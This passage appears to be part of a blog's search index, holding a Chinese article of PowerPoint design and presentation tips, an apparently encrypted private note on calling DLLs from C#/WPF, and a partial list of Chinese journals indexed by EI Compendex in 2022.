为什么？ 一、PPT毕竟不是电影，其逻辑结构是抽象的，难以把握； 二、PPT是一页页翻下去的，一次只能看一页内容，前面看过的只能依靠记忆。 解决的办法有两个：一是事先给每位观众发一份演说纲要；二是给你的PPT建立清晰的导航系统。 导航系统主要包括：一、从片头动画、封面、前言、目录，到切换页、正文页、结尾页等一套完整的PPT架构（本书第3章将详细介绍）；二、每页都有标题栏（除了标明整个PPT的标题，更重要的是标明本章节的标题、本页的主题）；三、页码，如果方便的话也尽可能加上。 【 绝招四：没有设计就等于垃圾 】 传统上，我们把PPT归结为办公处理之类的工具，认为只要简单排版就可以满足需求。随着整个社会审美标准的提升，这一观点正被越来越多的人抛弃。 PPT，特别是对外PPT，正成为公司形象识别系统的重要组成部分，代表着一个公司的脸面；设计，正成为PPT的核心技能之一，也是PPT 水准高低的基本标准。 无论是汇报、宣传还是比赛、竞标，一个设计精美的PPT最少可以起到以下作用：（1）让观众赏心悦目：美女养眼，精美的PPT养神。（2）让观众产生好感：爱美之心人皆有之，漂亮的PPT自然能让观众多看几眼。（3）赢得观众的信任：人总是有偏见的，精美的设计给人专业、认真、可靠的感觉，内容的含金量也自然得到提升。（4）赢得成功的机会：在职场上，美女与帅哥有更多成功的机，PPT演示也是如此。内容的好坏难以评价，但形式的优劣却显而易见，喜欢而又信任的方案自然是领导和客户的首选。 设计非一日之功，但我们可以找到捷径：（1）善用专业素材：专业的PPT模板让你的PPT拥有外在美；专业的PPT图表让你的PPT具备内在美；专业的PPT图片（包括JPG、PNG、AI等格式）让你的PPT充满生机。（2）掌握排版的基本原则：每个人的审美标准是不同的，但总有一些规律是相通的，掌握并遵守这些规则，将使你的PPT设计得到大多数人的认可。这些规则包括：一个中心、合理对齐、画面统一、强烈对比、层次分明等。（3）多看精美案例：PPT诞生以来的十多年里，整个社会的设计水准都在迅速提高，三人行，必有我师，在平面设计、动画领域，处处都有值得我们学习的案例。 【 绝招五：炫不是动画的根本 】 自PPT诞生以来，动画就一直是最大的争议。一种观点认为，PPT就是幻灯片，就是一页一页翻过的图片加文字，在商务PPT应用领域，根本不需要动画或者最多只需简单的页面切换动画；相反，有无数的仁人志士对 PPT动画矢志不渝，用自己的创意和努力一次次创作动画的传奇，也得到众多PPT爱好者的欢呼雀跃。近年来，锐普PPT把PPT动画成功应用到商务领域，并得到客户的广泛认同。 动画，不仅仅让PPT变得生动，更能让PPT表现效果数倍提升。 1） 片头动画让你的PPT一把抓住观众眼球。电影有片头、游戏有片头、网站有片头，PPT演示也需要片头。演示开始时，观众往往会需要一个适应期，也许还在想着刚才没有处理完的工作，也许还在跟邻座侃侃而谈，也许还在抱怨着观看演示的辛苦，这时候，你需要立即把观众的视线聚焦到你的演示中来，精美和创意的片头能立即给观众带来震撼，让观众目不转睛。 2） 逻辑动画一幅静止的画面，观众会自上而下全面浏览，缺乏逻辑的引导，观众难以把握重点，看完之后还要思考其中的逻辑关系，实际上浪费了精力和注意力；如果给这幅画面加上清晰的逻辑动画，就把观众自己找线索变成了帮观众理线索。演示者可以控制对象出现的先后顺序、主次顺序、位置改变、出现和退出等，引导观众按照自己的思路理解PPT内容。片头动画让对外宣传的PPT 尽显企业的专业与实力。一束光闪过，该公司的logo由轮廓逐渐变得靓丽十足，让人记忆深刻；紧跟的4张动画页面从不同角度展现了上海及该公司的风貌，同时配以连续抽象的文字和动画效果，消除了页面之间的分割感。 3） 强调动画以往我们只是用颜色的深浅、形状的大小以及字体的不同来突出某些重要内容，这有一个很大的弊端，就是要强调的内容会一直处于强调地位，当我们讲述别的内容时，它会分散观众的视线；强调动画，通过对象的放大、缩小、闪烁、变色等动作实现强调效果，并能够让演示者自如控制，强调过后自动回复到初始状态。 4） 片尾动画与那些戛然而止的PPT相比，加一个简单的片尾动画将收到意想不到的效果：一是作为礼貌，提醒大家演示结束，并给人一定的缓冲时间，准备接下来的活动；二是与片头动画相呼应，做到有始有终，避免给人虎头蛇尾的印象；三是通过贯穿始终的形式，提醒观众回忆内容，强化记忆 。 5） 情景动画也许你讲述的就是一个故事，故事总是有情节、有过程的，而要用一张静止的画面去表达一个完整的过程，几乎不可能。相反，一套连续的动画，则能把这些过程表现得栩栩如生。以往，我们用Flash、视频来表现这些效果，PPT其实也能够实现。 【 绝招六：图表是PPT的筋脉 】 商业演示的基本内容就是数据，于是图表变得必不可少。最早出现的是柱图、饼图、线图、雷达图等；咨询公司把数据图表转移到对逻辑关系的表达上，于是出现了并列、包含、扩散、综合、层进等各类关系图表，从此，文字也可以不再抽象、乏味了；以ThemeGallery为代表的韩国公司、以PresentationLoad为代表的欧美公司以及以锐普PPT为代表的中国公司等设计公司，则进一步把这一趋势发挥到极致——加入了设计的概念，从此，文字可以变得像图画一样精美、形象、栩栩如生。同样，PowerPoint 软件就像天生为图表而生的，强大的像Illustrator一样的绘图功能，加上清晰的操作界面、简单的操作模式，让人人都能轻而易举地掌握。很快，PPT图表就风靡全球，与图片配合使用，让演示如虎添翼。如果你的PPT还在受大段文字的困扰，还在为逻辑混乱而发愁，那就赶快学习PPT图表吧。 【 绝招七：没有策划就没有精品 】 好的PPT是策划出来的，就像宏伟的建筑是规划出来的。所有的PPT设计师者首先是策划师，有的是无意识为之，有的是用心去做的，但没有策划的PPT必定是失败的作品。不同的演示目的、不同的演示风格、不同的受众对象、不同的使用环境，决定了不同的PPT结构、色彩、节奏、动画效果等，PPT的人介于观众、领导、演示者等多重标准的审视。一个好的PPT作品基于对以上要求的准确把握。我们曾经有一些卓越的设计师，出来的作品很美、很耐看，但却一直得不到客户的认可，为什么？就是缺乏准确的策划。美，不是PPT的唯一标准；经验、用心、设身处地为观众着想，即使画面有瑕疵，也往往能赢得演示者的认同和观众的喝彩。 【 绝招八：PPT可以当主角 】 西方有一种观点开始在中国流行：演讲者永远是主角，PPT 不过是陪衬。其实这完全是站在西方立场上的一种观点，未必适应中国国情。 西方人大多喜欢张扬，擅长演说，甚至在很多人看来演说已经是一种享受，当然不愿意被PPT抢了风头；但中国文化更强调内秀，不愿意抛头露面，擅长演说者更是寥寥，甚至连一些领导在众人面前也不愿张扬，何况一般人？所以，我们常常把自己作为的一员，是我们代表演说，我们不过是一种符号，低调再低调，宁可把PPT作为众人瞩目的焦点。 从另一个角度讲：我们是为了演示而演示吗？是为了表现自我吗？当然不是！每次我们都是抱着一定的目的进行演示的，或者为了让观众了解我们的工作，或者为了让观众选择我们的产品，或者为了沟通一些信息，或者纯粹为了博得大伙一乐……能找到必须让我们成为主角的理由吗？没有！效果为王，只要能达到目的，不要在乎谁是主角、谁是配角。 如果你是一位表现欲极强的演说大师，如果这是一个需要你展示自我的舞台，那你就勇敢地站出来，做主角吧！如果你是一位稍微内敛的工作者，为了工作才进行这次演示，或者这是一个需要低调的场合，那就不必拘泥于大师们的说教，即使你是配角，也能得到最热烈的喝彩。 【 绝招九：PPT不是哑巴 】 在很多人眼中，PPT是多媒体的代名词。但这个多媒体，却一直因为无声而名不副实。 细分析，无声原因有三：一是PPT的商务特点限制了声音的应用，毕竟在商务会议场所，人们需要集中精力思考，无论是背景音乐还是动画声音都会给人们带来干扰；二是PPT软件设计的功能限制了声音的应用，PPT软件生下来就没有为声音的应用做好充分准备，仅仅了这一功能，对声音的编辑、优化等功能，PowerPoint还无心顾及；三是PPT人群实在太广，经理、文员、老师、销售代表、老总、领导、甚至一些小学生都成了PPT技术员，大家相关的知识储备远不够，缺乏声音素材、缺乏声音感觉、缺乏声音编辑的技术，但不知不觉中，有人还是尝试起来，结果声音应用不专业，特别有些动作声音常常引来观众一阵哗然。 于是，有人总结了，PPT勿用声音。果真这么绝对吗？形势正在悄悄变化，PPT有声时代正在来临。（1）PPT早已不再限于汇报演示，企业宣传、婚庆礼仪、休闲娱乐等正成为PPT应用的热点领域，声音是不可或缺的元素。（2）平面设计、flash、视频等时刻冲击着人们的视觉，人们正经受着最严重的审美疲劳，单纯靠画面给人的刺激已经大大降低，声音是增强画面冲击力的绝佳武器。（3）PPT设计公司的崛起，让PPT声音的处理专业化，声音素材库搭建起来，各类声音编辑软件应用自如，配音设备逐步完善，PPT中声音运用的规律也已经把握到位。 【 绝招十：退“三”进“七” 】 要让PPT高人一等有很多方法，率先使用 PowerPoint 2007/ 20 10 ，无疑是最有效的捷径。从PPT专业应用角度看，PowerPoint的以下特点都是我们极为推崇的。 （1）操作界面更美观、更人性化 ●全新的vista般操作界面，让人赏心悦目； ●对文件整体管理的功能集中到左上角的office按钮里，为操作区留出更大空间； ●操作区域更开阔、归类更合理，操作熟练后一目了然； ●自定义按钮非常个性化，把常用的功能放在这里调用更快捷； ●选择窗格与Photoshop窗格类似，“层出不穷”成为现实，使PPT各项功能全面提升； ●放大/缩小按钮与视图模式按钮同时放置于右下角，更适应一般人的操作习惯。（2）绘图和设计功能更强大（3）丰富而实用的功能集群这些功能包括： ●SmartArt图表，可以把文字轻松转化为图表。（只是目前所的图表种类较少，质感过于单调，从设计的角度并不主张过多应用。） ●为PPT文件减肥，2007版的PPTX格式的文件比 2003版的PPT格式文件小了很多。 ●PPT可以直接转为pdf、xps、jpg等格式，并可把其中的部分PPT页面发布出来，供各类场合使用。 ●有效防止文档崩溃，在2003版里一旦文档出错，没有保存的数据都会丢失；2007版则能够尽力恢复程序关闭前的状态。 但2007版也存在一些明显的遗憾：其一是对电脑硬件要求较高。不少学员反映，500MHz以下的处理器、256MB以下的内存的电脑用起来都较吃力。其二是与2003版的兼容性不够。PPTX文档一般要转化成PPT文档或者安装插件才能在2003版的 PowerPoint中读取。 用2007版所作的立体艺术文字、艺术图形在2003版中是无法编辑的，部分颜色渐变效果、阴影效果、文字效果，甚至一些动画在2003版里会发生变形，需要在2007版里对照编辑。但这些缺陷改变不了2007 /2010 版快速普及的趋势，要想实现超人一等的PPT表现效果，PowerPoint 2007 /2010 无疑是最佳的选择。 ====================================== 毕业论文答辩或者学术报告，需要做课件的可以看一下，对于POWERPOINT的技巧就不多说了，只将一些容易犯的毛病。 1、信息应当保留一半。写在幻灯片上的占一半，另一半是通过口头的形式讲授的，要不然听讲的人只需要看幻灯片的话就能理解，就不认真听你说的什么话了，两种感官不能同时使用，就会造成困倦和睡意（尤其是针对对自己无用的内容）； 2、尽量在网上收集一些模板，存在自己的U盘中，以供随时调用。图片式的不要用（也就是母版只有一张图片，每张幻灯片插入一张占满空间的图会使幻灯片很膨大，打开缓慢，影响别人的观看），有一些商务模板，主题版式、内容版式、目录版式、结论版式都是不一样的，尽管格调一样，选择这样的模板会事半功倍；选择的时候，让你震惊一下不得不服的才用，平淡无奇的就不要用了。 3、线条图以及坐标等，能用powerpoint自带绘图工具制作的就用它，简洁、明快，又能说明问题，线条图比照片等有优势的地方是一看就能看出水平。而且最要命的一点是，尽管photoshop等能制作复杂的图案，但是不能以RGB模式保存成JPEG，而直接在OFFICE里面制作的图则显出很鲜艳的效果，针对线条图用自带的工具反而比photoshop强些； 4、如果你要插入大的照片，注意采用“图片工具栏”里面的剪裁工具突出主题，比如要展示一个人，大头贴已经够了；展示老式火车，显示一个车头，带烟囱的部分和很小一段铁轨已经够了，显示肉食动物，一张血盆大口和利牙已经够了，何必管它是老虎还是豹子呢？现在相机越来越高级了，做的PPT都十分大，其实很多无关的内容尽量不要让它减慢你的电脑运行速度。也就是窥一斑而见全豹，这已经足够了，PPT的效果取决于整体的版面布置，而不是一张张图片都要做到完整。现在的人有很大的毛病就是总是把观众当傻瓜，面面俱到，结果是重点讲述的地方用鼠标晃来晃去还是看不清； 5、如果你要插入文本框，将文本框分散对齐，然后按住ALT键精确调节，使得整个字段呈一矩形，在图片的空挡中表现的十分整齐，字体用黑体不加粗，字号标题用36-44，正文最小20，最大28,24最合适，行间距推荐1.2倍-1.5倍。 6、一张幻灯片涵盖的内容并不多，不建议将每个对象都设置一个不同的动画，点一下鼠标出来一个信息块，挤香肠一样，让观众干着急，为了设悬念而采用这种方法很差劲，不如点击一下翻一张，内容一次性呈现比较好； 7、要说明一个问题，尽量采用幽默一点的图片和小动画，不要把气氛搞得死气沉沉的；这些图片实际上在各个网站的动漫库里面都要，平时下载一些，分门别类存储，做的时候根据你要说明的主题调用，很有好处，单从美术工艺的角度讲，储存一些这样的动漫也不坏；宁肯用简图，也不要使用不清楚的照片，分辨率差是很大的问题，google搜不到就自己绘制简图。 8、幻灯片中的图片务必精确对齐，当然啦，ALT、0.382/0.618这些常识性的东西，还是要自己把握，在电脑上播放一下，自己看起来不顺眼的就返回普通模式改正，直到自己觉得有点艺术效果为止。 9、文本框不要带边框，文字颜色与背景颜色较好的几种搭配如下：深绿背景+白色字体；天蓝背景+白色字体；红色背景+黄色字体；白色背景+黑色字体。避免使用黑色背景+白色字体，下面看的人会感到十分刺眼。","tags":""},{"title":"手把手教你使用C#及WPF调用dll","url":"/20220617/shou-ba-shou-jiao-ni-shi-yong-c-ji-wpf-diao-yong-dll/","text":"da96f8157c5b7935a3fa1d90440e225c47c27573dfccea35bb3aa62babaccf91ce92ff3a5f37ee1b47950d55400d6e114d90d625424a31c3740e208b64956292a41e0bf943e16cf7d02082341929c8b9886cfe353ca7c48ecb12b6c2ee8388e802e4b37592eedce469d492be42dcccef15654f9ebe7cdabead1c782448250a9423dcf5dd974c8b93127455741c944eac309947646dcff422a1f36ad3f2dc88001e81f2cf9a46b39da283011b7af20c8ca77ff3e78e3db1bfab5010a8ddef0361633b5249c22e51d4bb6ce3fa40f233347a17f827485e904719587f92bcbcb5cceceb96f30d5cfe7d352d08a4d1822e848471b2b58734e3755f6687c81b1a3b034209461fdd3bad013ab72f026c9bf620dddfb9dea24546d862a314dec306dd6c1b294d3a7ffeb6ddabce8c61f5ac56b5130581c870a8fc7d8894af305404c08d76c815fb5ce588625d10fcfd441c18db53ea1f848eff8a377eff05a967e68b11bf536531a7fb26ead4bc09100498f8d003e64acac4f931c66c8814820562339a54f4a148bdcfda0ec7da41599a6d6ff2968fd16350f90518c637d79baee7466a95b530019835000cad563b83d7663af5cb9ce5b4e7e66c7e108494312ad6104d784ad5649a88bf9b5ab2f0018590d64af4b21dfe10d6f07d35106c0b0cce8d73f6f855f60a4642d8cd558d2e3c7e4efc9fa4b0fef3645a4a104571c9eab28840d066cc3f7d608f82fa01e3c40541c8f7dcba60c7bba9fae9e9d4a4dd1df9b427ae0d463da4a536e02e7369a35e9641eaa1d1108463d4f7761dbb6eefcf054dfc51cf4b78b23da3ced5f4ee8dfbadfaea7ab43598bcd1b2f529b67c7b555c5f32d4a55b6f1a2c1bda779bdc5333f5391fc6b2bd4ae710516c096e23f4215825dc6df996868c1d413089a0b82313dc30eff81bdccb544dfce286ca5ace5d0272dbe29a748eb7c14c27a9ce19fa8cb55cd67eb7bf226c40f6f1ff3ea158e736aaf51f0d3b85c3f8aeb3c8194953e8dff94b81bfd783c828c52edc11cdcc5717ce5aaab39acfa1f2dadeb082406ee936f13479a5d361ee40b3636c9433dea35baff90ceff68fa048e7c49bf9d3c161dc5f143b300cbd75e01a609c54b34a37c10faac2f9d33ecbbedc51c6bc6fc0e6c16c2c1a3bc465a980fa99c294bf3d349343c84c8e874466d3082f1d12fcf790c7ce10155285e17f274678e4d2cd7100c5d91463afd2a0d94bc2ae63b3db55f3f857e97e1019b4ca6d73d909b2f27b142f0186254ac3452b53f92d3dc846ac45278aa4ba27bc976e82a98841a18a15c0c8eac2697a03c163af3178125e1dd8c637865f11235a1d0098f33289e115eea896a99a92e5ab1a06b8931f9010c39a797bcac6067d665aad546ed947e676705773b3a9d51061fb767bd48899549aae1b80f6270be6022378e3f90bf83271a2debacd937e2c3198756dd26d6d8c78fcfe992b88d4328f2041eae454026567e981e65ce64116db430c67c593ff236d2c5471879fb4b4408b33da6525b1676d41f27f76d6dc492707afc2151e4c36d2fc647300dde31fe7599f9f727cf6bf821fb7a3661ae5112454bc978858e07969e165555d7aa51dc7217edfad3119774db6af9025699a70e498b744e005b17792b06858a0d6dcc979deb271bd3aa711e74b9b7fdd393c490d1d51375e122e764bfce8c02ad27a27c9c585ecd1a37c774b1e45180ab69c9f0fd8aa16e288e7c2e00e471ee647fcba9632ddaf33d73dfbba52df719c102bc5b8ab24fca076f9b8b372680fecf064f703c31115ede15f1edb724b18af86b24e25e3ef99ccfe09a3d0c16b3b9a23fa71bcb7461eda5f21d8d3a0ad7635569d7f08a7163824be1850e875e3b1a774f30028477c505ec0de790aeb94b98ca7029c075cafe7f307d00a5fe246675efe7638d4a49a725775aadd7ff79a5fcdf85693595cd5a0755a9633b3aa8064a26a7a346c4a9c57e2e0f04244cb31fb5c6853c5abe679f1c06a4e41e56547a1efc87ba56d7bc9f840a1f36defec16d647df2543d36bab92db58549230aed0875551edfe3d4f7668b129804f0dc4e7a75a436f78c92beaa00a957dce93670407c721504297d4460b396c18aee18162d47804e436a097e87a9544c850ec7bf7f4b156e46f210268bb4b69edfcd9fb057861403537e969c02051e41c6747c9654cc4ca1fc69894d8c7b29340d1590dd5d8564394d154e1c737f15d9521caa63159d17fa8ee1fe727f420db6e3a6a964977f9b4c95e7f6c6b05d163b0d3179a0fad0a8c 个人笔记，仅供个人查阅","tags":""},{"title":"EI收录的中国（中文）期刊（2022版）","url":"/20220616/ei-shou-lu-de-zhong-guo-zhong-wen-qi-kan-2022-ban/","text":"转载自EI收录的中国（中文）期刊（2022版） 2021年Ei Compendex收录期刊源列表目录中“CHINESE JRS on SERIALS LIST”列表中，收录中国期刊253本！ EI收录的中国（中文）期刊（2021版），出自版本号：CPXSourceList012022！ COMPENDEX SOURCE LIST: UPDATED JANUARY 1, 2022PRINT ISSNONLINE ISSNCHINESE TITLE (中文刊名)ENGLISH/TRANSLATED TITLE (英文刊名)Ei 2022 INDEXING STATUS (2022年Ei收录状况)03710025-声学学报Acta AcusticaRenewed (保持收录)10006893-航空学报Acta Aeronautica et Astronautica SinicaRenewed (保持收录)10001093-兵工学报Acta ArmamentariiRenewed (保持收录)02544156-自动化学报Acta Automatica SinicaRenewed (保持收录)03722112-电子学报Acta Electronica SinicaRenewed (保持收录)02540096-太阳能学报Acta Energiae Solaris SinicaRenewed (保持收录)2096095623657499-Acta GeochimicaRenewed (保持收录)10011595-测绘学报Acta Geodaetica et Cartographica SinicaRenewed (保持收录)03755444-地理学报Acta Geographica SinicaRenewed (保持收录)00015717-地质学报Acta Geologica SinicaRenewed (保持收录)10003851-复合材料学报Acta Materiae Compositae SinicaRenewed (保持收录)0567771816143116力学学报（英文版）Acta Mechanica SinicaRenewed (保持收录)0894916618602134-Acta Mechanica Solida SinicaRenewed (保持收录)04121961-金属学报Acta Metallurgica SinicaRenewed (保持收录)1006719121941289-Acta Metallurgica Sinica (English Letters)Renewed (保持收录)02532239-光学学报Acta Optica SinicaRenewed (保持收录)02532697-石油学报Acta Petrolei SinicaRenewed (保持收录)10018719-石油学报: 石油加工Acta Petrolei Sinica (Petroleum Processing Section)Renewed (保持收录)1000056920958927岩石学报Acta Petrologica SinicaRenewed (保持收录)10044213-光子学报Acta Photonica SinicaRenewed (保持收录)10003290-物理学报Acta Physica SinicaRenewed (保持收录)04798023-北京大学学报(自然科学版)Acta Scientiarum Naturalium Universitatis PekinensisRenewed (保持收录)20963246-工程科学与技术Advanced Engineering ScienceRenewed (保持收录)-25425048-Advanced Industrial and Engineering Polymer ResearchNew (新收录)2095312721953597-Advances in ManufacturingNew (新收录)10000992-力学进展Advances in MechanicsRenewed (保持收录)10016791-水科学进展Advances in Water ScienceRenewed (保持收录)0253482715732754-Applied Mathematics and Mechanics (English Edition)Renewed (保持收录)10006931-原子能科学技术Atomic Energy Science and TechnologyRenewed (保持收录)10001026-电力系统自动化Automation of Electric Power SystemsRenewed (保持收录)1000680X-汽车工程Automotive EngineeringRenewed (保持收录)2096065420960654-Big Data Mining and AnalyticsRenewed (保持收录)2096552425228552-Bio-Design and ManufacturingRenewed (保持收录)10034722-桥梁建设Bridge ConstructionRenewed (保持收录)1996359919968744&nbsp;-Building SimulationRenewed (保持收录)10006613-化工进展Chemical Industry and Engineering ProgressRenewed (保持收录)02510790-高等学校化学学报Chemical Journal of Chinese UniversitiesRenewed (保持收录)1000131X-土木工程学报China Civil Engineering JournalRenewed (保持收录)10006923-中国环境科学China Environmental ScienceRenewed (保持收录)10017372-中国公路学报China Journal of Highway and TransportRenewed (保持收录)1004132X-中国机械工程China Mechanical EngineeringRenewed (保持收录)0890548721918945-China Ocean EngineeringRenewed (保持收录)10014632-中国铁道科学China Railway ScienceRenewed (保持收录)10079289-中国表面工程China Surface EngineeringRenewed (保持收录)10009361--Chinese Journal of AeronauticsRenewed (保持收录)10000720-分析试验室Chinese Journal of Analysis LaboratoryNew (新收录)0253382018722040分析化学Chinese Journal of Analytical ChemistryRenewed (保持收录)18722067--Chinese Journal of CatalysisRenewed (保持收录)10049541--Chinese Journal of Chemical EngineeringRenewed (保持收录)02544164-计算机学报Chinese Journal of ComputersRenewed (保持收录)1022465310224653-Chinese Journal of ElectronicsRenewed (保持收录)10069941-含能材料Chinese Journal of Energetic MaterialsRenewed (保持收录)20959389-工程科学学报Chinese Journal of EngineeringRenewed (保持收录)10077812-火炸药学报Chinese Journal of Explosives and PropellantsRenewed (保持收录)00015733-地球物理学报Chinese Journal of Geophysics (Acta Geophysica Sinica)Renewed (保持收录)10004548-岩土工程学报Chinese Journal of Geotechnical EngineeringRenewed (保持收录)02587025-中国激光Chinese Journal of LasersRenewed (保持收录)10007032-发光学报Chinese Journal of LuminescenceRenewed (保持收录)10053093-材料研究学报Chinese Journal of Materials ResearchRenewed (保持收录)1000934521928258-Chinese Journal of Mechanical Engineering (English Edition)Renewed (保持收录)10040609-中国有色金属学报Chinese Journal of Nonferrous MetalsRenewed (保持收录)256767914396203-Chinese Journal of Polymer Science (English Edition)New (新收录)02587076-稀有金属Chinese Journal of Rare MetalsRenewed (保持收录)10006915-岩石力学与工程学报Chinese Journal of Rock Mechanics and EngineeringRenewed (保持收录)02543087-仪器仪表学报Chinese Journal of Scientific InstrumentRenewed (保持收录)04591879-力学学报Chinese Journal of Theoretical and Applied MechanicsRenewed (保持收录)20951531-中国光学Chinese OpticsRenewed (保持收录)16717694--Chinese Optics LettersRenewed (保持收录)1674105620583834-Chinese Physics BRenewed (保持收录)0023074X20959419科学通报（中文）Chinese Science BulletinRenewed (保持收录)04381157-化工学报CIESC JournalRenewed (保持收录)2096043320960662-Computational Visual MediaRenewed (保持收录)10065911-计算机集成制造系统Computer Integrated Manufacturing Systems, CIMSRenewed (保持收录)10001239-计算机研究与发展Computer Research and DevelopmentRenewed (保持收录)10010920-控制与决策Control and DecisionRenewed (保持收录)10008152-控制理论与应用Control Theory and ApplicationsRenewed (保持收录)2095698321980942-Control Theory and TechnologyRenewed (保持收录)2475742X--CPSS Transactions on Power Electronics and ApplicationsNew (新收录)-22149147-Defence TechnologyRenewed (保持收录)2096395520963955地球与行星物理Earth and Planetary PhysicsNew (新收录)10002383-地球科学：中国地质大学学报Earth Science&nbsp; Journal of China University of GeosciencesRenewed (保持收录)10052321-地学前缘Earth Science FrontiersRenewed (保持收录)167136641993503X-Earthquake Engineering and Engineering VibrationRenewed (保持收录)1007449X-电机与控制学报Electric Machines and ControlRenewed (保持收录)10066047-电力自动化设备Electric Power Automation EquipmentRenewed (保持收录)10004750-工程力学Engineering MechanicsRenewed (保持收录)02503301-环境科学Environmental ScienceRenewed (保持收录)10011455-爆炸与冲击Explosion and Shock WavesRenewed (保持收录)10035214-精细化工Fine ChemicalsRenewed (保持收录)10026630-食品科学Food ScienceRenewed (保持收录)2223769022237704-FrictionRenewed (保持收录)2095017920950187-Frontiers of Chemical Science and EngineeringRenewed (保持收录)2095222820952236-Frontiers of Computer ScienceRenewed (保持收录)209522012095221X-Frontiers of Environmental Science and EngineeringRenewed (保持收录)20959184&nbsp;20959230-Frontiers of Information Technology &amp; Electronic EngineeringRenewed (保持收录)2095275920952767-Frontiers of OptoelectronicsRenewed (保持收录)2095243020952449-Frontiers of Structural and Civil EngineeringRenewed (保持收录)16718860-武汉大学学报（信息科学版）Geomatics and Information Science of Wuhan UniversityRenewed (保持收录)1001155220959508大地构造与成矿学Geotectonica et MetallogeniaRenewed (保持收录)2096511725900358-Global Energy InterconnectionNew (新收录)2096279724680257-Green Energy and EnvironmentRenewed (保持收录)10066748--High Technology LettersRenewed (保持收录)10036520-高电压技术High Voltage EngineeringRenewed (保持收录)10072276-红外与激光工程Infrared and Laser EngineeringRenewed (保持收录)1476818617518520-International Journal of Automation and ComputingRenewed (保持收录)1756378X17563798-International Journal of Intelligent Computing and CyberneticsRenewed (保持收录)-25888404-International Journal of Lightweight Materials and ManufactureRenewed (保持收录)167447991869103X-International Journal of Minerals, Metallurgy and MaterialsRenewed (保持收录)20952686--International Journal of Mining Science and TechnologyRenewed (保持收录)2226410822278508-Journal of Advanced CeramicsNew (新收录)10008055-航空动力学报Journal of Aerospace PowerRenewed (保持收录)10001328-宇航学报Journal of AstronauticsRenewed (保持收录)10050930-应用基础与工程科学学报Journal of Basic Science and EngineeringRenewed (保持收录)10040579--Journal of Beijing Institute of Technology (English Edition)Renewed (保持收录)10015965-北京航空航天大学学报Journal of Beijing University of Aeronautics and AstronauticsRenewed (保持收录)10075321-北京邮电大学学报Journal of Beijing University of Posts and TelecommunicationsRenewed (保持收录)10015515-生物医学工程学杂志Journal of Biomedical EngineeringRenewed (保持收录)1672652925432141-Journal of Bionic EngineeringRenewed (保持收录)-23699698-Journal of Bioresources and BioproductsNew (新收录)10079629-建筑材料学报Journal of Building MaterialsRenewed (保持收录)10006869-建筑结构学报Journal of Building StructuresRenewed (保持收录)2095289922275223-Journal of Central South University (English Edition)Renewed (保持收录)16727207-中南大学学报 （自然科学版）Journal of Central South University (Science and Technology)Renewed (保持收录)10039015-高校化学工程学报Journal of Chemical Engineering of Chinese UniversitiesRenewed (保持收录)1005888522105123-Journal of China Universities of Posts and TelecommunicationsRenewed (保持收录)10001964-中国矿业大学学报Journal of China University of Mining and TechnologyRenewed (保持收录)16735005-中国石油大学学报Journal of China University of Petroleum (Edition of Natural Science)Renewed (保持收录)10056734-中国惯性技术学报Journal of Chinese Inertial TechnologyRenewed (保持收录)10097848-中国食品学报Journal of Chinese Institute of Food Science and TechnologyRenewed (保持收录)10042997-质谱学报Journal of Chinese Mass Spectrometry SocietyRenewed (保持收录)2096108125093312通信与信息网络学报Journal of Communications and Information NetworksNew (新收录)1000900018604749-Journal of Computer Science and TechnologyRenewed (保持收录)10039775-计算机辅助设计与图形学学报Journal of ComputerAided Design and Computer GraphicsRenewed (保持收录)10095896-电子与信息学报Journal of Electronics and Information TechnologyRenewed (保持收录)20954956--Journal of Energy ChemistryRenewed (保持收录)0253231X-工程热物理学报Journal of Engineering ThermophysicsRenewed (保持收录)1001074218787320-Journal of Environmental Sciences (China)Renewed (保持收录)20956002-食品科学技术学报Journal of Food Science and Technology (China)New (新收录)02532409-燃料化学学报Journal of Fuel Chemistry and TechnologyRenewed (保持收录)10067043-哈尔滨工程大学学报Journal of Harbin Engineering UniversityRenewed (保持收录)03676234-哈尔滨工业大学学报Journal of Harbin Institute of TechnologyRenewed (保持收录)16714512-华中科技大学学报 自然科学版Journal of Huazhong University of Science and Technology (Natural Science Edition)Renewed (保持收录)16742974-湖南大学学报Journal of Hunan University Natural SciencesRenewed (保持收录)05599350-水利学报Journal of Hydraulic EngineeringRenewed (保持收录)1001605818780342-Journal of HydrodynamicsRenewed (保持收录)10019014-红外与毫米波学报Journal of Infrared and Millimeter WavesRenewed (保持收录)1000324X-无机材料学报Journal of Inorganic MaterialsRenewed (保持收录)1006706X22103988-Journal of Iron and Steel Research InternationalRenewed (保持收录)16715497-吉林大学学报（工学版）Journal of Jilin University (Engineering and Technology Edition)Renewed (保持收录)10035427-湖泊科学Journal of Lake SciencesRenewed (保持收录)2213956722139567-Journal of Magnesium and AlloysRenewed (保持收录)10014381-材料工程Journal of Materials EngineeringRenewed (保持收录)10050302--Journal of Materials Science and TechnologyRenewed (保持收录)05776686-机械工程学报Journal of Mechanical EngineeringRenewed (保持收录)16733363-采矿与安全工程学报Journal of Mining and Safety EngineeringRenewed (保持收录)2196562521965420-Journal of Modern Power Systems and Clean EnergyRenewed (保持收录)10012486-国防科技大学学报Journal of National University of Defense TechnologyRenewed (保持收录)10053026-东北大学学报Journal of Northeastern UniversityRenewed (保持收录)10002758-西北工业大学学报Journal of Northwestern Polytechnical UniversityRenewed (保持收录)10014055-推进技术Journal of Propulsion TechnologyRenewed (保持收录)2095283X-雷达学报Journal of RadarsNew (新收录)10062106-铁道工程学报Journal of Railway Engineering SocietyRenewed (保持收录)1672702916727029铁道科学与工程学报Journal of Railway Science and EngineeringNew (新收录)10020721--Journal of Rare EarthsRenewed (保持收录)1007461920959494遥感学报Journal of Remote SensingRenewed (保持收录)16744926--Journal of SemiconductorsRenewed (保持收录)10062467-上海交通大学学报Journal of Shanghai Jiaotong UniversityRenewed (保持收录)1007117219958188-Journal of Shanghai Jiaotong University (Science)Renewed (保持收录)10077294-船舶力学Journal of Ship MechanicsRenewed (保持收录)10009825-软件学报Journal of SoftwareRenewed (保持收录)1000565X-华南理工大学学报 自然科学版Journal of South China University of Technology (Natural Science)Renewed (保持收录)10037985--Journal of Southeast University (English Edition)Renewed (保持收录)10010505-东南大学学报 （自然科学版）Journal of Southeast University (Natural Science Edition)Renewed (保持收录)02582724-西南交通大学学报Journal of Southwest Jiaotong UniversityRenewed (保持收录)16711793--Journal of Systems Engineering and ElectronicsRenewed (保持收录)10096124--Journal of Systems Science and ComplexityRenewed (保持收录)1004375618619576-Journal of Systems Science and Systems EngineeringRenewed (保持收录)02539721-纺织学报Journal of Textile ResearchRenewed (保持收录)02539993-煤炭学报Journal of the China Coal SocietyRenewed (保持收录)10018360-铁道学报Journal of the China 